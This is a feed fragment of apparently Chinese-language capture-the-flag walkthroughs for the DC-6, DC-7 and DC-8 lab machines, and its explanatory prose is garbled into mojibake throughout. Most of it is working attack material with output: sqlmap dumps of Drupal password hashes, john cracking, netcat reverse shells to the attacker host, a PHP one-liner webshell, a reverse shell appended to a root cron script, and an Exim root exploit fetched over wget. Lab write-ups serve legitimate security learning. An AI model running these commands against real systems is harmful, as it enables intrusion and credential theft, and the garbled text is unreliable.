<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db --tables</code></p>
<blockquote>
<p> Database: d7db<br>[88 tables]<br>+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+<br>| filter                      |<br>| system                      |<br>| actions                     |<br>| authmap                     |<br>| batch                       |<br>| block                       |<br>| block_custom                |<br>| block_node_type             |<br>| block_role                  |<br>| blocked_ips                 |<br>| cache                       |<br>| cache_block                 |<br>| cache_bootstrap             |<br>| cache_field                 |<br>| cache_filter                |<br>| cache_form                  |<br>| cache_image                 |<br>| cache_menu                  |<br>| cache_page                  |<br>| cache_path                  |<br>| cache_views                 |<br>| cache_views_data            |<br>| ckeditor_input_format       |<br>| ckeditor_settings           |<br>| ctools_css_cache            |<br>| ctools_object_cache         |<br>| date_format_locale          |<br>| date_format_type            |<br>| date_formats                |<br>| field_config                |<br>| field_config_instance       |<br>| field_data_body             |<br>| field_data_field_image      |<br>| field_data_field_tags       |<br>| field_revision_body         |<br>| field_revision_field_image  |<br>| field_revision_field_tags   |<br>| file_managed                |<br>| file_usage                  |<br>| filter_format               |<br>| flood                       |<br>| history                     |<br>| image_effects               |<br>| image_styles                |<br>| menu_custom                 |<br>| menu_links                  |<br>| menu_router                 |<br>| node                        |<br>| node_access                 |<br>| node_revision               |<br>| node_type                   |<br>| queue                       |<br>| rdf_mapping                 |<br>| registry                    |<br>| registry_file               |<br>| role                        |<br>| role_permission             |<br>| search_dataset              |<br>| search_index                |<br>| search_node_links           |<br>| search_total                |<br>| semaphore                   |<br>| sequences                   |<br>| sessions                    |<br>| shortcut_set                |<br>| shortcut_set_users          |<br>| site_messages_table         |<br>| taxonomy_index              |<br>| taxonomy_term_data          |<br>| taxonomy_term_hierarchy     |<br>| taxonomy_vocabulary         |<br>| url_alias                   |<br>| users                       |<br>| users_roles                 |<br>| variable                    |<br>| views_display               |<br>| views_view                  |<br>| watchdog                    |<br>| webform                     |<br>| webform_component           |<br>| webform_conditional         |<br>| webform_conditional_actions |<br>| webform_conditional_rules   |<br>| webform_emails              |<br>| webform_last_download       |<br>| webform_roles               |<br>| webform_submissions         |<br>| webform_submitted_data      |<br>+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+</p>
</blockquote>
<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users --columns</code></p>
<blockquote>
<p> Database: d7db<br>Table: users<br>[16 columns]<br>+â€”â€”â€”â€”â€”â€”+â€”â€”â€”â€”â€”â€”+<br>| Column           | Type             |<br>+â€”â€”â€”â€”â€”â€”+â€”â€”â€”â€”â€”â€”+<br>| language         | varchar(12)      |<br>| access           | int(11)          |<br>| created          | int(11)          |<br>| data             | longblob         |<br>| init             | varchar(254)     |<br>| login            | int(11)          |<br>| mail             | varchar(254)     |<br>| name             | varchar(60)      |<br>| pass             | varchar(128)     |<br>| picture          | int(11)          |<br>| signature        | varchar(255)     |<br>| signature_format | varchar(255)     |<br>| status           | tinyint(4)       |<br>| theme            | varchar(255)     |<br>| timezone         | varchar(32)      |<br>| uid              | int(10) unsigned |</p>
</blockquote>
<br>

<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users -C name,pass -dump</code></p>
<blockquote>
<p>Database: d7db<br>Table: users<br>[2 entries]<br>+â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”+<br>| name  | pass                                                    |<br>+â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”+<br>| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |<br>| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |<br>+â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”+</p>
</blockquote>
<p>è·‘å‡ºæ¥ä¸¤æ¡æ•°æ® ï¼Œä½†æ˜¯å¯†ç æ˜¯åŠ å¯†çš„ï¼Œæ ¹æ®johnç”¨æˆ·åæç¤ºï¼Œä½¿ç”¨<code>john</code>è§£å¯†</p>
<br>

<p><code>admin</code> ä½¿ç”¨johnæ²¡è·‘å‡ºæ¥</p>
<p><code>john</code> å¯†ç ä¸º<code>turtle</code></p>
<p><code>http://192.168.18.141/user/</code>ç™»å½•æˆåŠŸ</p>
<p>æ‰“å¼€contentçœ‹çœ‹</p>
<p><img src="/posts/437699f/content.png"></p>
<br>

<h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p>contact usé¡µé¢å¯ä»¥ç¼–è¾‘</p>
<p>ä¿®æ”¹æˆphpæ ¼å¼</p>
<p><img src="/posts/437699f/ncshell.png"></p>
<p><img src="/posts/437699f/submit.png"></p>
<p>åå¼¹äº¤äº’shell</p>
<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p><img src="/posts/437699f/python_shell.png"></p>
<h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>  æŸ¥çœ‹å…·æœ‰rootæƒé™çš„å‘½ä»¤</p>
<p><img src="/posts/437699f/find.png"></p>
<p>è¯•ç€åˆ©ç”¨ä¸‹exim4</p>
<p>æŸ¥çœ‹exim4ç‰ˆæœ¬</p>
<p><code>exim4 --version</code></p>
<blockquote>
<p>Exim version 4.89 </p>
</blockquote>
<p><code>searchsploit  exim 4</code></p>
<p>æ‰¾ä¸‹expï¼Œé€‰æ‹©46996.sh,æ‹·è´åˆ°æœ¬åœ°ï¼Œå¹¶å¼€å¯kaliçš„httpæœåŠ¡</p>
<blockquote>
<p>cp /usr/share/exploitdb/exploits/linux/local/46996.sh dc8.sh</p>
<p>python2 -m SimpleHTTPServer</p>
</blockquote>
<p>åœ¨é¶æœºä¸Šä¸‹è½½kaliçš„shell,å…ˆå›åˆ°/tmp ç›®å½•ä¸‹</p>
<blockquote>
<p>wget <a href="http://192.168.18.131:8000/dc8.sh">http://192.168.18.131:8000/dc8.sh</a></p>
</blockquote>
<p>æ³¨æ„:ç›´æ¥æŠŠexpä¸‹è½½è¿‡å»æ˜¯æ— æ³•ä½¿ç”¨çš„ï¼Œ<code>sed -i -e &#39;s/\r$//&#39; dc8.sh</code></p>
<blockquote>
<p>www-data@dc-8:/tmp$ ls<br>ls<br>getShell.sh<br>www-data@dc-8:/tmp$ chmod 777 dc8.sh<br>chmod 777 dc8.sh<br>www-data@dc-8:/tmp$ ./dc8.sh</p>
</blockquote>
<p>çœ‹ä¸‹æç¤ºç”¨æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Usage (setuid method):</span><br><span class="line"></span><br><span class="line"># $ id</span><br><span class="line"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span><br><span class="line"># $ ./raptor_exim_wiz -m setuid</span><br><span class="line"># Preparing setuid shell helper...</span><br><span class="line"># Delivering setuid payload...</span><br><span class="line"># [...]</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 /tmp/pwned</span><br><span class="line"># # id</span><br><span class="line"># uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">#</span><br><span class="line"># Usage (netcat method):</span><br><span class="line"># $ id</span><br><span class="line"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span><br><span class="line"># $ ./raptor_exim_wiz -m netcat</span><br><span class="line"># Delivering netcat payload...</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># localhost [127.0.0.1] 31337 (?) open</span><br><span class="line"># id</span><br><span class="line"># uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/437699f/flag.png"></p>
<br>

<br>

<blockquote>
<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="https://www.freebuf.com/articles/web/261074.html">https://www.freebuf.com/articles/web/261074.html</a></p>
<p><a href="https://my.oschina.net/u/3896378/blog/4427624">https://my.oschina.net/u/3896378/blog/4427624</a></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges7</title>
    <url>/posts/9488740e/</url>
    <content><![CDATA[<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><blockquote>
<p>ç½‘æ®µ        192.168.18.0/24</p>
<p>kali        192.168.18.131</p>
<p>é¶æœº        192.168.18.140</p>
</blockquote>
<h4 id="æ‰«æç½‘æ®µ"><a href="#æ‰«æç½‘æ®µ" class="headerlink" title="æ‰«æç½‘æ®µ"></a>æ‰«æç½‘æ®µ</h4><blockquote>
<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-07 14:16 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00045s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>53/tcp open  domain  dnsmasq 2.78<br>MAC Address: 00:50:56:E0:DA:9A (VMware)</p>
<p>Nmap scan report for 192.168.18.140<br>Host is up (0.00055s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 00:0C:29:7C:A6:2A (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Nmap scan report for 192.168.18.254<br>Host is up (0.00025s latency).<br>All 65535 scanned ports on 192.168.18.254 are filtered<br>MAC Address: 00:50:56:E1:37:77 (VMware)</p>
<p>Nmap scan report for 192.168.18.131<br>Host is up (0.0000030s latency).<br>All 65535 scanned ports on 192.168.18.131 are closed</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 64.63 seconds</p>
</blockquote>
<h4 id="æ‰«æé¶æœº"><a href="#æ‰«æé¶æœº" class="headerlink" title="æ‰«æé¶æœº"></a>æ‰«æé¶æœº</h4><blockquote>
<p> kali@kali2020:~$ sudo nmap 192.168.18.140 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-07 21:11 CST<br>Nmap scan report for 192.168.18.140<br>Host is up (0.0017s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 00:0C:29:7C:A6:2A (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 8.94 seconds</p>
</blockquote>
<h4 id="dirsearchæ‰«ç›®å½•"><a href="#dirsearchæ‰«ç›®å½•" class="headerlink" title="dirsearchæ‰«ç›®å½•"></a>dirsearchæ‰«ç›®å½•</h4><blockquote>
<p> <a href="http://192.168.18.140/user/login">http://192.168.18.140/user/login</a></p>
</blockquote>
<br>

<p>è¿›å…¥ä¸»é¡µçœ‹åˆ°æ—¶ä½¿ç”¨çš„<code>Drupa</code>ï¼Œä¹‹å‰çš„dc-1ä¹Ÿæ˜¯ä½¿ç”¨çš„è¿™ä¸ª</p>
<h4 id="æ ¹æ®æç¤ºæ‰¾çº¿ç´¢"><a href="#æ ¹æ®æç¤ºæ‰¾çº¿ç´¢" class="headerlink" title="æ ¹æ®æç¤ºæ‰¾çº¿ç´¢"></a>æ ¹æ®æç¤ºæ‰¾çº¿ç´¢</h4><blockquote>
<p>Welcome to DC-7</p>
<p>DC-7 introduces some â€œnewâ€ concepts, but Iâ€™ll leave you to figure out what they are.  :-)</p>
<p>While this challenge isnâ€™t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably wonâ€™t succeed.</p>
<p>What you will have to do, is to think â€œoutsideâ€ the box.</p>
<p>Way â€œoutsideâ€ the box.  :-)</p>
</blockquote>
<blockquote>
<p>dc-7å¼•å…¥äº†ä¸€äº›â€œæ–°â€æ¦‚å¿µï¼Œä½†æˆ‘è¿˜æ˜¯è®©ä½ ä»¬è‡ªå·±æ¥å¼„æ¸…æ¥šå®ƒä»¬æ˜¯ä»€ä¹ˆã€‚â€”-)<br>è™½ç„¶è¿™ä¸ªæŒ‘æˆ˜å¹¶ä¸å®Œå…¨æ˜¯æŠ€æœ¯æ€§çš„ï¼Œä½†å¦‚æœä½ éœ€è¦è¯‰è¯¸ç²—æš´çš„å¼ºè¿«æˆ–å­—å…¸æ”»å‡»ï¼Œä½ å¯èƒ½ä¸ä¼šæˆåŠŸã€‚<br>ä½ è¦åšçš„æ˜¯ï¼Œæƒ³â€œå¤–é¢â€çš„ç›’å­ã€‚<br>â€œå¤–é¢â€çš„ç›’å­ã€‚â€”-)</p>
</blockquote>
<p>ä¸€ç›´æ²¡ææ‡‚è¿™ä¸ªå¤–ç›’å•¥æ„æ€ï¼Œçœ‹äº†ä¸‹åˆ«äººçš„åšå®¢ï¼ŒåŸæ¥åœ¨ä¸»é¡µä¸‹å·¦ä¸‹è§’æœ‰ä¸ª<code>@DC7USER</code>ï¼Œtwitterä¸Šæç¤º</p>
<p>äº†githubåœ°å€ï¼Œ<code>https://github.com/Dc7User</code>,é‡Œé¢æœ‰ä¸€ä¸ª<code>staffdb</code>,é¦–å…ˆçœ‹ä¸‹<code>config.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">	<span class="variable">$username</span> = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line">	<span class="variable">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br><span class="line">	<span class="variable">$dbname</span> = <span class="string">&quot;Staff&quot;</span>;</span><br><span class="line">	<span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="sshç™»å½•"><a href="#sshç™»å½•" class="headerlink" title="sshç™»å½•"></a>sshç™»å½•</h3><p>å¯ä»¥å¾—åˆ°ä¸€ä¸ªæ•°æ®åº“çš„è´¦å·å¯†ç ï¼Œè¯•äº†ä¸‹æ— æ³•ç™»å½•ç½‘ç«™</p>
<p>çœ‹çœ‹è¿™ä¸ªè´¦å·å¯†ç èƒ½ä¸èƒ½ç™»å½•ssh</p>
<p><code>dc7user</code> <code>MdR3xOgB7#dW</code>ï¼ŒæˆåŠŸç™»å½•</p>
<blockquote>
<p><strong>dc7user@dc-7:~$ sudo -l</strong><br>-bash: sudo: command not found</p>
<p>** dc-7:~$ sudo **</p>
<p>-bash: sudo: command not found<br>You have new mail in /var/mail/dc7user<br>** dc7user@dc-7:~$ cat /var/mail/dc7user ** .</p>
<p>å†…å®¹å’Œä¸‹é¢mboxå·®ä¸å¤š</p>
</blockquote>
<br>

<blockquote>
<p>** dc7user@dc-7:<del>$ ls **<br>backups  mbox<br>** dc7user@dc-7:</del>$ cat mbox **</p>
<p>å‘ç°äº†3ä¸ªå¤‡ä»½æ–‡ä»¶</p>
<p>æ•°æ®åº“æ–‡ä»¶</p>
<p>/home/dc7user/backups/website.sql</p>
<p>shellè„šæœ¬æ–‡ä»¶ </p>
<p>/opt/scripts/backups.sh</p>
<p>ç½‘ç«™å¤‡ä»½æ–‡ä»¶</p>
<p>/home/dc7user/backups/website.tar.gz</p>
</blockquote>
<br>

<blockquote>
<p>** dc7user@dc-7:~$ cat /opt/scripts/backups.sh  **</p>
<p>#!/bin/bash<br>rm /home/dc7user/backups/*<br>cd /var/www/html/<br>drush sql-dump â€“result-file=/home/dc7user/backups/website.sql<br>cd ..<br>tar -czf /home/dc7user/backups/website.tar.gz html/<br>gpg â€“pinentry-mode loopback â€“passphrase PickYourOwnPassword â€“symmetric /home/dc7user/backups/website.sql<br>gpg â€“pinentry-mode loopback â€“passphrase PickYourOwnPassword â€“symmetric /home/dc7user/backups/website.tar.gz<br>chown dc7user:dc7user /home/dc7user/backups/*<br>rm /home/dc7user/backups/website.sql<br>rm /home/dc7user/backups/website.tar.gz<br>dc7user@dc-7:~ $<br>** dc7user@dc-7:~$ ls -l /opt/scripts/backups.sh **</p>
<p>-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh</p>
</blockquote>
<p>bashè„šæœ¬ä¸­æœ‰ç”¨åˆ°<code>drush</code>å’Œ<code>gpg</code>å‘½ä»¤ï¼ŒæŸ¥æŸ¥ç”¨æ³•</p>
<p>å¯ä»¥ä½¿ç”¨<code>gpg</code>å’Œ<code>drush</code>å‘½ä»¤</p>
<h3 id="ä½¿ç”¨drushä¿®æ”¹ç®¡ç†å‘˜å¯†ç "><a href="#ä½¿ç”¨drushä¿®æ”¹ç®¡ç†å‘˜å¯†ç " class="headerlink" title="ä½¿ç”¨drushä¿®æ”¹ç®¡ç†å‘˜å¯†ç "></a>ä½¿ç”¨drushä¿®æ”¹ç®¡ç†å‘˜å¯†ç </h3><p>drushå¯ä»¥ä¿®æ”¹ç”¨æˆ·å¯†ç </p>
<blockquote>
<p>Drushæ˜¯Drupalçš„å‘½ä»¤è¡Œshellå’ŒUnixè„šæœ¬æ¥å£ã€‚Drush Coreé™„å¸¦äº†è®¸å¤šæœ‰ç”¨çš„å‘½ä»¤ï¼Œå¯ç”¨äºä¸æ¨¡å—/ä¸»é¢˜/é…ç½®æ–‡ä»¶ç­‰ä»£ç è¿›è¡Œäº¤äº’ã€‚</p>
</blockquote>
<p><code>drush user-password admin --password=&quot;123&quot;</code></p>
<blockquote>
<p>dc7user@dc-7:~ $ drush user-password admin â€“password=â€123â€<br>Command user-password needs a higher bootstrap level to run - you will need to invoke drush from a more functional Drupal environment to run this command.                                                                      [error]<br>The drush command â€˜user-password adminâ€™ could not be executed.                                                                                                                                                                  [error]<br>dc7user@dc-7:~$ </p>
</blockquote>
<p>æ‰§è¡Œå¤±è´¥ï¼Œè¿›å…¥/var/www/htmlç›®å½•è¯•è¯•</p>
<blockquote>
<p>dc7user@dc-7:/var/www/html$ drush user-password admin â€“password=â€123â€<br>Changed password for admin                                                                                                                                                                                                      [success]<br>dc7user@dc-7:/var/www/html$ </p>
</blockquote>
<p>ä¿®æ”¹å¯†ç æˆåŠŸï¼Œè¯•è¯•èƒ½ä¸èƒ½ç™»å½•ç½‘ç«™<code>http://192.168.18.140/user/login</code></p>
<p><code>admin</code>,<code>123</code>æˆåŠŸç™»å½•</p>
<h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p>æƒ³åŠæ³•åå¼¹shellï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬è¿æ¥</p>
<p>æ–°å»ºæ–‡ä»¶å‘ç°ç±»å‹æ²¡æœ‰php</p>
<p><img src="/posts/9488740e/nophp.png"></p>
<p>çœ‹çœ‹<code>Extend</code>æ’ä»¶æ‰©å±•èƒ½ä¸èƒ½å®‰è£…php,æ²¡æ‰¾åˆ°ï¼Œéœ€è¦æ‰‹åŠ¨å®‰è£…ï¼Œçœ‹äº†ä¸‹åˆ«äººçš„wp</p>
<p>ä¸‹è½½php filteræ¨¡å—</p>
<blockquote>
<p><a href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a></p>
</blockquote>
<p><img src="/posts/9488740e/phpinstallerror.png"></p>
<p>æç¤ºå®‰è£…æ ¼å¼åº”è¯¥ä¸º<code>zip tar tgz gz bz2</code></p>
<p>ä¸‹è½½tar.gz ä¿å­˜åˆ°æœ¬åœ°ç„¶åä¸Šä¼ </p>
<p><img src="/posts/9488740e/phpinstall1.png"></p>
<p><img src="/posts/9488740e/phpinstall2.png"></p>
<p><img src="/posts/9488740e/phpinstall3.png"></p>
<p><img src="/posts/9488740e/phpinstall4.png"></p>
<p>å®‰è£…æˆåŠŸ</p>
<p>å†™ä¸ªphpinfo()è¯•è¯•èƒ½ä¸èƒ½æˆåŠŸ</p>
<p><img src="/posts/9488740e/phpinfo1.png"></p>
<p><img src="/posts/9488740e/phpinfo2.png"></p>
<h4 id="å†™ä¸€å¥è¯"><a href="#å†™ä¸€å¥è¯" class="headerlink" title="å†™ä¸€å¥è¯"></a>å†™ä¸€å¥è¯</h4><p><img src="/posts/9488740e/yijuhua.png"></p>
<h4 id="è¿æ¥èšå‰‘"><a href="#è¿æ¥èšå‰‘" class="headerlink" title="è¿æ¥èšå‰‘"></a>è¿æ¥èšå‰‘</h4><p><img src="/posts/9488740e/yijuhua_yijian.png"></p>
<br>

<h4 id="ncåå¼¹shell"><a href="#ncåå¼¹shell" class="headerlink" title="ncåå¼¹shell"></a>ncåå¼¹shell</h4><blockquote>
<p>kali <code>nc -nlvp 8888</code></p>
<p>èšå‰‘ <code>nc -c /bin/sh 192.168.18.131 8888</code></p>
</blockquote>
<p><img src="/posts/9488740e/shell.png"></p>
<p>åå¼¹äº¤äº’shell</p>
<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>å°†åå¼¹shellçš„è„šæœ¬å†™å…¥åˆ°<code>/opt/scripts/backups.sh</code></p>
<p><code>echo &quot;nc -e /bin/bash 192.168.18.131 7777&quot; &gt;&gt; /opt/scripts/backups.sh</code></p>
<p>æˆåŠŸåå¼¹åˆ°rootçš„shell ï¼Œä¸è¿‡éœ€è¦å¤šç­‰ä¸€ä¼šæ‰è¡Œ</p>
<p><img src="/posts/9488740e/rootshell.png"></p>
<p><img src="/posts/9488740e/flag.png"></p>
<blockquote>
<p>æ³¨:å…¶å®å¯ä»¥åœ¨å†™ä¸€å¥è¯çš„æ—¶å€™å¯ä»¥ç›´æ¥å†™åå¼¹shell<br><code>&lt;?php system(&#39;nc -e /bin/sh 192.168.18.131 9999&#39;); ?&gt;</code><br><img src="/posts/9488740e/ncshell.png"></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges6</title>
    <url>/posts/e38f4498/</url>
    <content><![CDATA[<p>TIPS</p>
<blockquote>
<p>CLUE<br>OK, this isnâ€™t really a clue as such, but more of some â€œwe donâ€™t want to spend five years waiting for a certain process to finishâ€ kind of advice for those who just want to get on with the job.</p>
<p>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</p>
</blockquote>
<br>

<p>ç¯å¢ƒ</p>
<blockquote>
<p>ç½‘æ®µ    192.168.18.0/24</p>
<p>kali    192.168.18.131</p>
<p>é¶æœº </p>
</blockquote>
<br>

<p>æ‰«æç½‘æ®µ</p>
<blockquote>
<p><strong>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn</strong></p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-06 19:40 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00027s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.137<br>Host is up (0.00047s latency).<br>MAC Address: 00:0C:29:74:F8:D0 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00029s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 1.97 seconds</p>
</blockquote>
<p>æ‰«æé¶æœºå¼€æ”¾çš„ç«¯å£</p>
<blockquote>
<p><strong>kali@kali2020:~$ sudo nmap 192.168.18.137 -p- -sV</strong></p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-06 19:41 CST<br>Nmap scan report for 192.168.18.137<br>Host is up (0.0017s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br><strong>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</strong></p>
<p><strong>80/tcp open  http    Apache httpd 2.4.25 ((Debian))</strong></p>
<p>MAC Address: 00:0C:29:74:F8:D0 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds</p>
</blockquote>
<p>å¼€æ”¾äº†22ç«¯å£å’Œ80ç«¯å£</p>
<p>dirsearchæ‰«ä¸€ä¸‹ç›®å½•</p>
<blockquote>
<p>â€¦ ..</p>
<p>[19:44:43] 301 -  321B  - /wp-content  -&gt;  <a href="http://192.168.18.137/wp-content/">http://192.168.18.137/wp-content/</a><br>[19:44:43] 301 -  319B  - /wp-admin  -&gt;  <a href="http://192.168.18.137/wp-admin/">http://192.168.18.137/wp-admin/</a></p>
<p>[19:44:43] 301 -  322B  - /wp-includes  -&gt;  <a href="http://192.168.18.137/wp-includes/">http://192.168.18.137/wp-includes/</a></p>
<p>[19:44:43] 200 -   42KB - /wp-includes/<br>[19:44:43] 500 -    0B  - /wp-content/plugins/hello.php<br>[19:44:43] 200 -    0B  - /wp-config.php    </p>
<p>[19:44:44] 302 -    0B  - /wp-admin/  -&gt;  <a href="http://wordy/wp-login.php?redirect_to=http://192.168.18.137/wp-admin/&amp;reauth=1">http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192.168.18.137%2Fwp-admin%2F&amp;reauth=1</a></p>
<p>[19:44:44] 302 -    0B  - /wp-signup.php  -&gt;  <a href="http://wordy/wp-login.php?action=register">http://wordy/wp-login.php?action=register</a></p>
<p>â€¦ â€¦</p>
</blockquote>
<br>

<p>æµè§ˆå™¨ç™»å½•<code>192.168.18.137</code>å‘ç°ä¼šè·³è½¬åˆ°<code>http://wordy</code>ï¼Œé‚£éœ€è¦ä¿®æ”¹ä¸€ä¸‹host</p>
<blockquote>
<p>sudo vim /etc/hosts</p>
<p>192.168.18.137 wordy</p>
</blockquote>
<p>è¿›å…¥ä¸»é¡µå¯ä»¥çœ‹å‡ºè¿™æ˜¯<code>WordPress</code>,ç¬¬äºŒå…³ä¹Ÿæ˜¯WordPress</p>
<p>è¿›å…¥åå°<code>wordy/wp-login.php</code> </p>
<p>ä½¿ç”¨wpscanæ‰«ä¸€ä¸‹</p>
<blockquote>
<p>kali@kali2020:~$ wpscan â€“url wordy -e u</p>
<p>[i] User(s) Identified:</p>
<p>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - <a href="http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1">http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</a><br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)</p>
<p>[+] sarah<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
<p>[+] graham<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
<p>[+] mark<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
<p>[+] jens<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
</blockquote>
<p>ä¸€å…±æ‰«å‡º5ä¸ªç”¨æˆ·<code>admin,sarah,graham,mark,jens</code></p>
<p>æ ¹æ®å®˜ç½‘ä¸Šçš„çº¿ç´¢ï¼Œéœ€è¦ç”¨åˆ°kaliè‡ªå¸¦çš„<code>rockyou.txt</code></p>
<p>ä½†æ˜¯ä½¿ç”¨å‘½ä»¤æ—¶è¯´ä¸å­˜åœ¨ï¼Œå»çœ‹äº†ä¸‹éœ€è¦è§£å‹</p>
<p><code>gzip -d /usr/share/wordlists/rockyou.txt.gz</code></p>
<p><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</code></p>
<blockquote>
<p>kali@kali2020:<del>/Tools/DCchallenges/DCchallenges6$ cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords_DC6.txt<br>kali@kali2020:</del>/Tools/DCchallenges/DCchallenges6$ ls<br>passwords_DC6.txt  username.txt</p>
</blockquote>
<p>wpscançˆ†ç ´ä¸€ä¸‹</p>
